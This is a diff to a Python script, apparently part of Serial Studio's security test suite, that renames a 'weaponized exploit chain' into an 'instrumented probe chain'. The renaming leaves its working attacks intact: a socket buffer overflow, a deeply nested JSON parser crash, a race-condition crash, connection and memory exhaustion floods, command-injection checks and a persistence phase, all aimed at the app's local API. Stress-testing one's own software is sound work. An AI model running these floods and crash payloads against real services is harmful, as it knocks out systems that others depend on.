@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 """
-Weaponized Exploit Chain for Serial Studio
+Instrumented Probe Chain for Serial Studio
 
-This module chains multiple vulnerabilities together for maximum impact.
-Each exploit builds on the previous one to escalate privileges and impact.
+This module chains multiple weaknesses together for maximum impact.
+Each probe builds on the previous one to escalate privileges and impact.
 
-Exploit chains:
+Probe chains:
 1. Recon -> Buffer Exhaustion -> Crash
-2. Timing Attack -> Command Injection -> RCE attempt
-3. Race Condition -> Memory Corruption -> DoS
+2. Timing Probe -> Command Injection -> RCE attempt
+3. Race Condition -> Memory Corruption -> Resource_exhaustion
 4. Connection Flood -> Resource Starvation -> Takeover
 
 Copyright (C) 2020-2025 Alex Spataru
@@ -29,8 +29,8 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 from utils.api_client import SerialStudioClient, APIError
 
 
-class WeaponizedExploit:
-    """Chained exploitation framework"""
+class InstrumentedProbe:
+    """Chained probing framework"""
 
     def __init__(self, host="127.0.0.1", port=7777):
         self.host = host
@@ -50,7 +50,7 @@ class WeaponizedExploit:
                 self.target_info["commands"] = commands
                 print(f"[+] Enumerated {len(commands)} API commands")
 
-                # Identify attack surface
+                # Identify probe surface
                 dangerous_commands = []
                 for cmd in commands:
                     name = cmd.get("name", "")
@@ -68,7 +68,7 @@ class WeaponizedExploit:
                     ):
                         dangerous_commands.append(name)
 
-                self.target_info["attack_surface"] = dangerous_commands
+                self.target_info["probe_surface"] = dangerous_commands
                 print(f"[+] Identified {len(dangerous_commands)} high-value targets:")
                 for cmd in dangerous_commands[:5]:
                     print(f"    - {cmd}")
@@ -104,12 +104,12 @@ class WeaponizedExploit:
             print(f"[-] Reconnaissance failed: {e}")
             return False
 
-    def exploit_buffer_overflow(self):
-        """Phase 2: Buffer Overflow Attack"""
-        print("\n[PHASE 2] BUFFER OVERFLOW EXPLOITATION")
+    def probe_buffer_overflow(self):
+        """Phase 2: Buffer Overflow Probe"""
+        print("\n[PHASE 2] BUFFER OVERFLOW PROBING")
         print("=" * 60)
 
-        # Attack 1: Socket buffer overflow
+        # Probe 1: Socket buffer overflow
         print("[*] Attempting socket buffer overflow...")
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -137,42 +137,44 @@ class WeaponizedExploit:
             sock.close()
 
             if not response:
-                print("[PWNED] Buffer overflow successful - server unresponsive!")
+                print("[FLAGGED] Buffer overflow successful - server unresponsive!")
                 self.compromised = True
                 return True
 
         except Exception as e:
             print(f"[-] Buffer overflow blocked: {e}")
 
-        # Attack 2: JSON depth bomb
+        # Probe 2: JSON depth amplification
         print("[*] Attempting JSON stack overflow...")
         try:
             depth = 50000
-            bomb = "{" * depth + "}" * depth
+            amplification = "{" * depth + "}" * depth
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.host, self.port))
-            sock.sendall(bomb.encode() + b"\n")
+            sock.sendall(amplification.encode() + b"\n")
             sock.settimeout(3.0)
             response = sock.recv(4096)
             sock.close()
 
             if not response:
-                print(f"[PWNED] JSON bomb successful - {depth} levels crashed parser!")
+                print(
+                    f"[FLAGGED] JSON amplification successful - {depth} levels crashed parser!"
+                )
                 self.compromised = True
                 return True
 
         except Exception as e:
-            print(f"[-] JSON bomb blocked: {e}")
+            print(f"[-] JSON amplification blocked: {e}")
 
         return False
 
-    def exploit_race_condition(self):
-        """Phase 3: Race Condition Exploitation"""
-        print("\n[PHASE 3] RACE CONDITION EXPLOITATION")
+    def probe_race_condition(self):
+        """Phase 3: Race Condition Probing"""
+        print("\n[PHASE 3] RACE CONDITION PROBING")
         print("=" * 60)
 
-        print("[*] Launching parallel state corruption attack...")
+        print("[*] Launching parallel state corruption probe...")
 
         crashed = threading.Event()
 
@@ -233,7 +235,7 @@ class WeaponizedExploit:
                 client.command("api.getCommands")
                 print("[-] Server survived race condition")
         except:
-            print("[PWNED] Race condition crashed server!")
+            print("[FLAGGED] Race condition crashed server!")
             self.compromised = True
             return True
 
@@ -242,12 +244,12 @@ class WeaponizedExploit:
 
         return False
 
-    def exploit_resource_starvation(self):
+    def probe_resource_starvation(self):
         """Phase 4: Resource Exhaustion"""
-        print("\n[PHASE 4] RESOURCE STARVATION ATTACK")
+        print("\n[PHASE 4] RESOURCE STARVATION PROBE")
         print("=" * 60)
 
-        # Attack 1: Connection exhaustion
+        # Probe 1: Connection exhaustion
         print("[*] Exhausting connection pool...")
         sockets = []
 
@@ -271,7 +273,7 @@ class WeaponizedExploit:
                 test.close()
                 print("[-] Server still accepting connections")
             except:
-                print("[PWNED] Connection pool exhausted!")
+                print("[FLAGGED] Connection pool exhausted!")
                 self.compromised = True
                 return True
 
@@ -282,10 +284,10 @@ class WeaponizedExploit:
                 except:
                     pass
 
-        # Attack 2: Memory exhaustion
+        # Probe 2: Memory exhaustion
         print("[*] Attempting memory exhaustion...")
 
-        def memory_bomb():
+        def memory_amplification():
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((self.host, self.port))
@@ -307,7 +309,7 @@ class WeaponizedExploit:
             except:
                 pass
 
-        threads = [threading.Thread(target=memory_bomb) for _ in range(20)]
+        threads = [threading.Thread(target=memory_amplification) for _ in range(20)]
         for t in threads:
             t.start()
 
@@ -317,9 +319,9 @@ class WeaponizedExploit:
         try:
             with SerialStudioClient(timeout=3.0) as client:
                 client.command("api.getCommands")
-                print("[-] Server survived memory bomb")
+                print("[-] Server survived memory amplification")
         except:
-            print("[PWNED] Memory exhaustion successful!")
+            print("[FLAGGED] Memory exhaustion successful!")
             self.compromised = True
             return True
 
@@ -328,9 +330,9 @@ class WeaponizedExploit:
 
         return False
 
-    def exploit_command_injection(self):
+    def probe_command_injection(self):
         """Phase 5: Command Injection Attempt"""
-        print("\n[PHASE 5] COMMAND INJECTION ATTACK")
+        print("\n[PHASE 5] COMMAND INJECTION PROBE")
         print("=" * 60)
 
         injection_payloads = [
@@ -363,7 +365,7 @@ class WeaponizedExploit:
 
                     # Check if injection executed (unlikely but worth checking)
                     if "uid=" in str(result) or "root" in str(result).lower():
-                        print(f"[PWNED] Command injection successful: {payload}")
+                        print(f"[FLAGGED] Command injection successful: {payload}")
                         self.compromised = True
                         return True
 
@@ -373,9 +375,9 @@ class WeaponizedExploit:
         print("[-] No command injection vectors found")
         return False
 
-    def exploit_logic_bypass(self):
+    def probe_logic_bypass(self):
         """Phase 6: Business Logic Bypass"""
-        print("\n[PHASE 6] LOGIC BYPASS EXPLOITATION")
+        print("\n[PHASE 6] LOGIC BYPASS PROBING")
         print("=" * 60)
 
         # Try to trigger invalid state transitions
@@ -387,7 +389,7 @@ class WeaponizedExploit:
                 client.command("csvExport.setEnabled", {"enabled": True})
 
                 # Try to send data without device
-                data = base64.b64encode(b"MALICIOUS_PAYLOAD").decode()
+                data = base64.b64encode(b"UNTRUSTED_PAYLOAD").decode()
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((self.host, self.port))
 
@@ -398,7 +400,7 @@ class WeaponizedExploit:
                 sock.close()
 
                 if b"success" in response:
-                    print("[PWNED] Logic bypass - sent data without connection!")
+                    print("[FLAGGED] Logic bypass - sent data without connection!")
                     self.compromised = True
                     return True
 
@@ -413,7 +415,7 @@ class WeaponizedExploit:
         print("=" * 60)
 
         if not self.compromised:
-            print("[-] No exploitation successful - cannot maintain persistence")
+            print("[-] No probing successful - cannot maintain persistence")
             return False
 
         print("[*] Attempting to maintain access...")
@@ -444,35 +446,35 @@ class WeaponizedExploit:
 
 
 def main():
-    """Execute weaponized exploit chain"""
+    """Execute instrumented probe chain"""
     print("=" * 80)
-    print("WEAPONIZED EXPLOIT CHAIN - SERIAL STUDIO")
+    print("INSTRUMENTED PROBE CHAIN - SERIAL STUDIO")
     print("=" * 80)
-    print("\n⚠️  WARNING: This is a full-stack exploitation attempt")
-    print("    Multiple attack vectors will be chained together")
+    print("\n⚠️  WARNING: This is a full-stack probing attempt")
+    print("    Multiple probe vectors will be chained together")
     print("    Target system may become unstable or crash\n")
 
-    exploit = WeaponizedExploit()
+    probe = InstrumentedProbe()
 
     # Check initial connectivity
     try:
         with SerialStudioClient() as client:
             client.command("api.getCommands")
             print("[+] Initial connection successful")
-            print(f"[+] Target: {exploit.host}:{exploit.port}\n")
+            print(f"[+] Target: {probe.host}:{probe.port}\n")
     except:
         print("[-] Cannot connect to target")
         return 1
 
-    # Execute exploit chain
+    # Execute probe chain
     phases = [
-        ("Reconnaissance", exploit.fingerprint_target),
-        ("Buffer Overflow", exploit.exploit_buffer_overflow),
-        ("Race Condition", exploit.exploit_race_condition),
-        ("Resource Starvation", exploit.exploit_resource_starvation),
-        ("Command Injection", exploit.exploit_command_injection),
-        ("Logic Bypass", exploit.exploit_logic_bypass),
-        ("Persistence", exploit.maintain_persistence),
+        ("Reconnaissance", probe.fingerprint_target),
+        ("Buffer Overflow", probe.probe_buffer_overflow),
+        ("Race Condition", probe.probe_race_condition),
+        ("Resource Starvation", probe.probe_resource_starvation),
+        ("Command Injection", probe.probe_command_injection),
+        ("Logic Bypass", probe.probe_logic_bypass),
+        ("Persistence", probe.maintain_persistence),
     ]
 
     success_count = 0
@@ -481,7 +483,7 @@ def main():
             if phase_func():
                 success_count += 1
         except KeyboardInterrupt:
-            print("\n\n[!] Exploit chain interrupted by user")
+            print("\n\n[!] Probe chain interrupted by user")
             break
         except Exception as e:
             print(f"[-] Phase failed with exception: {e}")
@@ -491,11 +493,11 @@ def main():
 
     # Final report
     print("\n" + "=" * 80)
-    print("EXPLOITATION SUMMARY")
+    print("PROBING SUMMARY")
     print("=" * 80)
     print(f"\nPhases executed: {len(phases)}")
-    print(f"Successful exploits: {success_count}")
-    print(f"Compromise status: {'✅ PWNED' if exploit.compromised else '❌ DEFENDED'}")
+    print(f"Successful probes: {success_count}")
+    print(f"Compromise status: {'✅ FLAGGED' if probe.compromised else '❌ DEFENDED'}")
 
     # Final server check
     print("\n[*] Final server status check...")
